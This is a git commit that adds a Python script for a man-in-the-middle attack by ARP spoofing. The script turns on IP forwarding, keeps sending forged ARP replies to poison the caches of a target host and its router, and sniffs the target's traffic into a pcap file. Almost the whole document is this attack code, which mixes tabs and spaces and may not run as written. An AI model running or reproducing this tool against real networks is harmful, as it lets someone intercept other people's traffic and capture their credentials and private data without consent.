28fe1f66ca8f2a3101875a6e9117004703ec91a4
Gil Matitiyahu <45760365+Gilresearch76@users.noreply.github.com>
2020-09-28 20:56:43 +0300

    Create MITM_using_ArpSpoofing.py

---
+++ MITM_using_ArpSpoofing.py
@@ -0,0 +1,48 @@
+#!/usr/bin/python
+import sys
+from threading import Thread
+from scapy.all import *
+from os import system
+from time import sleep
+
+system("clear")
+system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+path = raw_input("where do you want to save the pcap file? ")
+TargetIP = sys.argv[2]
+RouterIP = sys.argv[3]
+TargetAtk = ARP(op=2,psrc=RouterIP,pdst=TargetIP)
+RouterAtk = ARP(op=2,psrc=TargetIP,pdst=RouterIP)
+packets = 0
+x=0
+
+def display(pkt):
+	global packets
+	packets = packets+1
+	wrpcap(path+" "+".pcap", pkt, append=True)
+	system("clear")
+ 	print "The pcap file was created in the path :"+" "+path
+	print ""
+	print "Arp Spoofing is Running..."+" "+str(x)+" "+"packets of ARP have been sent So far."	
+	print "---------------------------------------------------------------------------------"
+	print ""
+  print "Sniffer is Running..."+" "+str(packets)+" "+"packets From the Target have been collected so far."
+	print "---------------------------------------------------------------------------------"	
+	
+	
+def sniffer():
+	pcap = sniff(iface=sys.argv[1],prn = display, filter = "host"+" "+TargetIP,)
+		
+def arp():
+  while True:
+		global x	
+		send(TargetAtk, verbose=0)
+		send(RouterAtk, verbose=0)
+		x=x+1
+		sleep(0.2)
+	
+def main():
+	Thread(target = sniffer).start()
+	Thread(target = arp).start() 
+	
+main()
